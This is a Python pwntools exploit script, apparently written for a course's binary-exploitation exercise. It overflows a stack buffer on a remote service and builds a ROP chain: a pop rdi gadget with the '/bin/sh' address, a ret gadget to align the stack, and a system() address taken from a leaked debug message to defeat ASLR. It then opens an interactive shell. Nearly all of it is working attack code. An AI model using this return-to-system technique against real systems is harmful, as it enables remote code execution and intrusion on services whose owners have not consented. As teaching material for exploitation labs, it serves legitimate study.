#!/usr/bin/python3
# 2022.09.23.2342.EST
from pwn import *

# In this exersize we will be utilizing int system(const char *command);
# system() is a wrapper for int execl(const char *pathname, const char *arg, ..., (char *) NULL);
# To accomplish this we will want to push the string '/bin/sh' to arg1 which will be RDI/RDX in the fastcall convention
# Once system() is called a child process will be forked and the parent will wait until the child returns to continue execution

bin_sh = p64(0x4020d0)    # Found by radare's [/ bin] search, confirmed by gdb's [x /s 0x4c20d0]
overflow = b"A"*32 + b"B"*8    # Overflows directly from the vulnerable buffer to the top of the stack
gadgets = {"pop rdi": p64(0x401423), "ret": p64(0x40101a)}

with remote("csc748.hostbin.org", 7042) as p:
    for n in range(2): msg = p.recv()    # 2 for the two newline characters from printf("Boot sequence initiated\n\n");

    # [NOTE] It looks like the target has ASLR enabled on their system
    # We can dynamically isolate where system is located via the debug output
    # Here we locate the preceding zeros of the debug message's system location and copy the exact location from there
    index = str(msg).index("0000")
    system_str = "0x" + str(msg)[index:index+16]
    system_offset = int(system_str, 16)
    system = p64(system_offset)

    """
    A more interesting and dynamic approach to finding the '/bin/sh' string can be done as follows
    1. Find where system() is located
    2. Calculate the offset from system() to where '/bin/sh' is located for libc's system() function
    3. Use this offset instead of any strings hardcoded into the binary itself, which may change depending on compilation parameters

    An example of how to do this may look as follows:

    # In gdb breaking on main's ret [find &system,+9999999,"/bin/sh"] returns 0x7ffff7f61117 which is '/bin/sh' in libc's system function
    # An offset can be calculated by subtracting system's location from the location of libc's '/bin/sh'
    #bin_sh_offset = 0x166c37    # Offset of '/bin/sh' from start of system (on a kali system)
    bin_sh_offset = 0x16232d    # Offet of '/bin/sh' from start of system (on an ubuntu system)
    bin_sh = p64(system_offset + bin_sh_offset)
    print("Utilizing '/bin/sh' string within system() at offset {} + {}".format(hex(system_offset), hex(bin_sh_offset)))
    """

    payload = b""
    payload += overflow
    payload += gadgets["pop rdi"]
    payload += bin_sh
    # Some GLIBC implementations require the stack to be 16-byte aligned. Ubuntu seems to require this wheras kali does not
    # This can be remedied by adding an additional ret gadget to the payload. This will offset by 8 bytes and properly align the stack
    # A reference to the movaps issue can be found here: https://ropemporium.com/guide.html
    payload += gadgets["ret"]
    payload += system
    payload += b"\n"

    p.send(payload)
    p.interactive()
